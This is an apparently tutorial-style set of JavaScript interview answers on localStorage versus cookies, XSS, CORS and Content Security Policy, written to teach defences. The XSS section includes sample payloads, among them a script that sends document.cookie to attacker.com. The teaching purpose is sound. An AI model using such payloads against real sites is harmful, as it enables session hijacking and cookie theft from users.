# JavaScript Interview Questions and Answers

---

**Topic : Web Storage and Security**

## **41. What is the difference between `localStorage`, `sessionStorage`, and cookies?**

---

## **1. Concept**

All three are **client-side storage mechanisms**, but they differ in:

• lifetime
• storage size
• accessibility
• security
• server involvement

Interviewers ask this to test **browser fundamentals + security awareness**.

---

## **2. High-Level Purpose**

| Storage Type     | Primary Use                  |
| ---------------- | ---------------------------- |
| `localStorage`   | Persistent client-side data  |
| `sessionStorage` | Temporary session-based data |
| Cookies          | Client–server communication  |

---

## **3. `localStorage`**

### What it is

`localStorage` stores data in the browser **with no expiration**.

Data remains even after:
• page reload
• browser restart

Until:
• manually cleared
• cleared via code
• user clears browser data

---

### Example

```javascript
localStorage.setItem("user", "Tanish");
const user = localStorage.getItem("user");
console.log(user); // Tanish
```

---

### Key Characteristics

• Persistent
• Key–value pairs (string only)
• Not sent to server
• Same-origin policy
• ~5–10 MB storage

---

## **4. `sessionStorage`**

### What it is

`sessionStorage` stores data **only for the current tab session**.

Data is cleared when:
• tab is closed

But **not cleared** on:
• page reload

---

### Example

```javascript
sessionStorage.setItem("token", "abc123");
console.log(sessionStorage.getItem("token"));
```

---

### Key Characteristics

• Temporary
• Per-tab (not shared across tabs)
• Not sent to server
• Same-origin policy
• ~5 MB storage

---

## **5. Cookies**

### What they are

Cookies are **small pieces of data** stored in the browser and **automatically sent to the server** with every HTTP request.

They are mainly used for:
• authentication
• sessions
• tracking

---

### Example

```javascript
document.cookie = "theme=dark; expires=Fri, 31 Dec 2027 23:59:59 GMT; path=/";
```

---

### Key Characteristics

• Can have expiration
• Sent with every request
• Size limit ~4 KB
• Can be HTTP-only
• Can be secured (`Secure`, `SameSite`)

---

## **6. Security Perspective (Very Important)**

### XSS Risk

| Storage        | XSS Vulnerable         |
| -------------- | ---------------------- |
| localStorage   | Yes                    |
| sessionStorage | Yes                    |
| Cookies        | Yes (unless HTTP-only) |

Important interview point:

> **Sensitive tokens should not be stored in `localStorage`**.

Why?
• JavaScript can access it
• XSS can steal tokens

---

### HTTP-only Cookies (Safer)

```http
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

Benefits:
• Not accessible via JavaScript
• Safer against XSS

---

## **7. Key Comparison Table (Interview Gold)**

| Feature        | localStorage | sessionStorage | Cookies               |
| -------------- | ------------ | -------------- | --------------------- |
| Lifetime       | Permanent    | Tab session    | Configurable          |
| Size           | ~5–10 MB     | ~5 MB          | ~4 KB                 |
| Sent to server | No           | No             | Yes                   |
| JS access      | Yes          | Yes            | Yes (unless HttpOnly) |
| Security       | Low          | Low            | Medium–High           |
| Use case       | Preferences  | Temp state     | Auth, sessions        |

---

## **8. Real-World Usage**

### Use `localStorage` for:

• theme preference
• language selection
• non-sensitive cached data

---

### Use `sessionStorage` for:

• multi-step forms
• temporary UI state
• session-only flags

---

### Use Cookies for:

• authentication tokens
• sessions
• server-side user identification

---

## **9. Common Interview Traps**

### Trap 1

❌ “Cookies are only client-side”

Wrong. Cookies are **client + server**.

---

### Trap 2

❌ “localStorage is secure”

Wrong. It is **XSS vulnerable**.

---

### Trap 3

❌ “sessionStorage persists across tabs”

Wrong. Each tab has its own storage.

---

## **10. Interview-Ready Summary**

`localStorage`, `sessionStorage`, and cookies are client-side storage mechanisms with different lifetimes and use cases. `localStorage` persists indefinitely, `sessionStorage` lasts for a single tab session, and cookies can be configured with expiration and are automatically sent to the server. Cookies are essential for authentication, while Web Storage APIs are better suited for client-only state. From a security perspective, sensitive data should be stored in HTTP-only cookies rather than Web Storage.

---

## **11. Quick Practice Interview Questions**

1. Which storage survives browser restart?
2. Which storage is sent to the server?
3. Why is `localStorage` unsafe for tokens?
4. What is HTTP-only cookie?
5. Difference between `localStorage` and `sessionStorage`?
6. Which storage is best for auth?
7. How does XSS affect Web Storage?

---

## **42. Can you explain Cross-Site Scripting (XSS) and how to prevent it?**

---

## **1. Concept**

**Cross-Site Scripting (XSS)** is a **security vulnerability** where an attacker injects **malicious JavaScript** into a trusted website, which then executes in the **user’s browser**.

Core idea (interview sentence):

> XSS occurs when untrusted input is rendered as executable JavaScript in the browser.

This allows attackers to:
• steal cookies / tokens
• hijack sessions
• deface UI
• perform actions as the user

---

## **2. Why XSS Is Dangerous (Interview Context)**

JavaScript runs with the **same privileges as your app**.

So if an attacker injects JS:
• browser cannot tell it’s malicious
• it can access DOM, cookies, storage

This is why XSS is considered a **critical security issue**.

---

## **3. Types of XSS (Very Important)**

There are **three main types** interviewers expect you to know.

---

### **1. Stored XSS (Persistent XSS)**

Malicious script is **stored in the database** and served to users.

Example:
• comment section
• user profile bio

```html
<script>
  alert("Hacked");
</script>
```

If stored and rendered → every visitor executes it.

---

### **2. Reflected XSS**

Malicious script comes from the **URL or request** and is reflected back in the response.

Example URL:

```
https://site.com/search?q=<script>alert(1)</script>
```

If server renders `q` directly → script executes.

---

### **3. DOM-Based XSS**

XSS happens **entirely in the browser**, without server involvement.

Example:

```javascript
const query = location.hash;
document.body.innerHTML = query;
```

If URL hash contains a script → it executes.

---

## **4. Simple XSS Example (Understand This Well)**

### ❌ Vulnerable Code

```html
<div id="output"></div>

<script>
  const userInput = "<img src=x onerror=alert(1)>";
  document.getElementById("output").innerHTML = userInput;
</script>
```

Why dangerous:
• `innerHTML` parses and executes HTML
• attacker controls input

---

## **5. How XSS Attacks Steal Data**

Example:

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

This can:
• steal session cookies
• hijack logged-in users

---

## **6. How to Prevent XSS (Most Important Part)**

### **1. Never Trust User Input**

Golden rule:

> Treat all user input as **malicious** by default.

---

### **2. Escape / Encode Output**

Use safe APIs:

❌ Dangerous

```javascript
element.innerHTML = userInput;
```

✅ Safe

```javascript
element.textContent = userInput;
```

`textContent` does NOT execute HTML.

---

### **3. Input Validation**

Validate on:
• client side (UX)
• server side (security)

Example:
• allow only expected characters
• reject scripts

---

### **4. Use HTTP-only Cookies**

```http
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

Why:
• JavaScript cannot read HttpOnly cookies
• prevents token theft via XSS

---

### **5. Content Security Policy (CSP)**

CSP restricts:
• inline scripts
• external script sources

Example:

```http
Content-Security-Policy: script-src 'self'
```

Even if XSS exists, CSP can **block execution**.

---

### **6. Avoid Dangerous APIs**

Avoid:
• `innerHTML`
• `outerHTML`
• `document.write()`
• `eval()`

Prefer:
• `textContent`
• `setAttribute`
• DOM APIs

---

## **7. XSS vs CSRF (Common Confusion)**

| XSS                    | CSRF                     |
| ---------------------- | ------------------------ |
| Executes JS in browser | Forces unwanted requests |
| Attacker runs script   | Attacker tricks user     |
| Client-side attack     | Server-side trust issue  |

Interviewers love this comparison.

---

## **8. Real-World Prevention Stack**

In production apps:
• escape output
• sanitize input
• use frameworks (React auto-escapes)
• enable CSP
• use HttpOnly cookies

---

## **9. Common Interview Traps**

### Trap 1

❌ “XSS is only a backend issue”

Wrong. DOM-based XSS is **frontend-only**.

---

### Trap 2

❌ “Using React means no XSS”

Wrong. `dangerouslySetInnerHTML` can still cause XSS.

---

## **10. Interview-Ready Summary**

Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious JavaScript into a trusted website, causing it to execute in users’ browsers. XSS can be stored, reflected, or DOM-based. It can steal sensitive data such as cookies and session tokens. XSS is prevented by escaping output, validating input, avoiding dangerous DOM APIs, using HTTP-only cookies, and enforcing Content Security Policy.

---

## **11. Quick Practice Interview Questions**

1. What is XSS?
2. Difference between stored and reflected XSS?
3. What is DOM-based XSS?
4. Why is `innerHTML` dangerous?
5. How does HttpOnly cookie help?
6. How does CSP reduce XSS impact?
7. XSS vs CSRF?

---
## **43. What is Cross-Origin Resource Sharing (CORS) and how does it work?**

---

## **1. Concept**

**CORS (Cross-Origin Resource Sharing)** is a **browser security mechanism** that controls **which origins are allowed to access resources from another origin**.

Core interview sentence:

> CORS is a browser-enforced security policy that allows a server to specify who can access its resources across different origins.

Important:
• CORS is enforced by the **browser**
• Not by JavaScript
• Not by the server runtime itself

---

## **2. What Is an “Origin”? (Must Know)**

An **origin** is defined by **three things**:

| Part     | Example       |
| -------- | ------------- |
| Protocol | `https`       |
| Domain   | `example.com` |
| Port     | `443`         |

So these are **different origins**:

```
https://example.com
http://example.com
https://api.example.com
https://example.com:3000
```

Change **any one** → new origin.

---

## **3. Same-Origin Policy (Why CORS Exists)**

By default, browsers follow the **Same-Origin Policy**:

> A web page can only make requests to the **same origin** it was loaded from.

This prevents:
• data theft
• malicious websites accessing private APIs

But modern apps need:
• frontend (domain A)
• backend API (domain B)

That’s where **CORS** comes in.

---

## **4. How CORS Works (High-Level Flow)**

1. Browser makes a request to another origin
2. Server responds with **CORS headers**
3. Browser checks headers
4. If allowed → response is accessible
5. If not → browser blocks it

⚠ Server may send data
⚠ Browser decides whether JS can read it

---

## **5. Simple CORS Example**

Frontend:

```
https://frontend.com
```

API:

```
https://api.backend.com
```

Request is **cross-origin**.

Server must send:

```http
Access-Control-Allow-Origin: https://frontend.com
```

Without it → browser blocks response.

---

## **6. Important CORS Headers (Interview Gold)**

### 1. `Access-Control-Allow-Origin`

```http
Access-Control-Allow-Origin: *
```

or

```http
Access-Control-Allow-Origin: https://frontend.com
```

Controls **who can access**.

---

### 2. `Access-Control-Allow-Methods`

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
```

Allowed HTTP methods.

---

### 3. `Access-Control-Allow-Headers`

```http
Access-Control-Allow-Headers: Content-Type, Authorization
```

Allowed request headers.

---

### 4. `Access-Control-Allow-Credentials`

```http
Access-Control-Allow-Credentials: true
```

Required when sending:
• cookies
• auth headers

⚠ Cannot be used with `*` origin.

---

## **7. Simple Request vs Preflight Request**

### Simple Request

Triggered when:
• GET / POST
• basic headers only

Browser sends request **directly**.

---

### Preflight Request (OPTIONS) – Very Important

Triggered when:
• custom headers (`Authorization`)
• methods like PUT, DELETE
• credentials included

Browser sends:

```http
OPTIONS /api
```

Server must respond with allowed rules.

Only then does browser send the actual request.

---

## **8. Common CORS Error (Interview Favorite)**

```
Access to fetch at 'api.com' from origin 'frontend.com'
has been blocked by CORS policy
```

Important explanation:

> The request reached the server, but the browser blocked access to the response.

---

## **9. CORS Is NOT a Security Feature for Servers**

Very important interview point:

• CORS protects **users**
• Not servers

Attackers can:
• bypass CORS using tools like curl
• make requests outside browser

---

## **10. Real-World Configuration Example (Express)**

```javascript
const cors = require("cors");

app.use(
  cors({
    origin: "https://frontend.com",
    credentials: true,
  }),
);
```

---

## **11. Common Interview Traps**

### Trap 1

❌ “CORS blocks requests”

Wrong.
CORS blocks **JavaScript access**, not requests.

---

### Trap 2

❌ “CORS is a backend security feature”

Wrong.
It’s **browser-enforced**.

---

## **12. Interview-Ready Summary**

Cross-Origin Resource Sharing (CORS) is a browser-enforced security mechanism that allows servers to specify which origins can access their resources. It works by using HTTP headers such as `Access-Control-Allow-Origin` that the browser checks before allowing JavaScript to access a cross-origin response. CORS enables safe cross-origin communication while preserving the browser’s same-origin policy.

---

## **13. Quick Practice Interview Questions**

1. What defines an origin?
2. Why does the browser enforce CORS?
3. Difference between simple and preflight requests?
4. What is an OPTIONS request?
5. Can CORS stop server-to-server requests?
6. Why can’t `*` be used with credentials?
7. Is CORS a security feature for servers?

---

## **44. How does Content Security Policy (CSP) help in preventing security attacks?**

---

## **1. Concept**

**Content Security Policy (CSP)** is a **browser security mechanism** that allows a website to **control which resources are allowed to load and execute**.

Core interview sentence:

> CSP is a security layer that restricts the sources from which content such as scripts, styles, images, and fonts can be loaded or executed.

CSP mainly protects against:
• Cross-Site Scripting (XSS)
• Data injection attacks

---

## **2. Why CSP Is Needed (Interview Context)**

Even with:
• input validation
• output escaping

Some XSS bugs may still exist.

CSP acts as a **second line of defense**:

> “Even if malicious code is injected, CSP can prevent it from executing.”

---

## **3. How CSP Works (High-Level Flow)**

1. Server sends a **CSP header**
2. Browser reads policy rules
3. Browser blocks any resource that violates the policy
4. Violation is logged or reported

CSP is **enforced by the browser**.

---

## **4. CSP Delivered via HTTP Header**

```http
Content-Security-Policy: default-src 'self'
```

This means:
• load resources only from same origin

---

## **5. Common CSP Directives (Interview Must-Know)**

### `default-src`

Fallback for all resource types.

```http
default-src 'self'
```

---

### `script-src` (Most Important)

Controls where JavaScript can come from.

```http
script-src 'self'
```

Blocks:
• inline scripts
• third-party scripts

---

### `style-src`

Controls CSS sources.

```http
style-src 'self' https://fonts.googleapis.com
```

---

### `img-src`

```http
img-src 'self' data:
```

Allows images from:
• same origin
• base64 data URLs

---

### `connect-src`

Controls:
• fetch
• XHR
• WebSocket

```http
connect-src 'self' https://api.example.com
```

---

## **6. How CSP Prevents XSS (Key Part)**

### Without CSP (Vulnerable)

```html
<script>
  alert(1);
</script>
```

Browser executes it.

---

### With CSP

```http
Content-Security-Policy: script-src 'self'
```

Result:
• inline script is blocked
• browser throws CSP violation

---

## **7. Inline Scripts & CSP (Important Interview Detail)**

By default, CSP **blocks inline scripts**.

To allow them (not recommended):

```http
script-src 'self' 'unsafe-inline'
```

⚠ `'unsafe-inline'` weakens CSP.

---

## **8. Nonce-Based CSP (Best Practice)**

Server generates a random nonce per request.

```html
<script nonce="abc123">
  console.log("Allowed");
</script>
```

Header:

```http
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

Benefits:
• allows specific inline scripts
• blocks injected ones

---

## **9. CSP Reporting (Monitoring Attacks)**

```http
Content-Security-Policy-Report-Only: script-src 'self'
```

• does NOT block
• only reports violations

Useful during rollout.

---

## **10. CSP vs Other Security Measures**

| Protection             | CSP       |
| ---------------------- | --------- |
| Prevents XSS execution | Yes       |
| Prevents injection     | Partially |
| Replaces validation    | No        |
| Enforced by browser    | Yes       |

CSP complements, not replaces, secure coding.

---

## **11. Common Interview Traps**

### Trap 1

❌ “CSP removes XSS bugs”

Wrong.
It **reduces impact**, not bugs.

---

### Trap 2

❌ “CSP is backend-only”

Wrong.
It’s **browser-enforced via headers**.

---

## **12. Real-World CSP Example**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self';
```

---

## **13. Interview-Ready Summary**

Content Security Policy (CSP) is a browser-enforced security mechanism that restricts where resources can be loaded from and which scripts can execute. It significantly reduces the impact of XSS and data injection attacks by blocking unauthorized scripts and resources. CSP works as an additional security layer and is most effective when combined with proper input validation and output encoding.

---

## **14. Quick Practice Interview Questions**

1. What is CSP?
2. How does CSP prevent XSS?
3. What is `script-src`?
4. Why are inline scripts blocked by default?
5. What is a nonce-based CSP?
6. Difference between CSP and CORS?
7. Can CSP replace input validation?
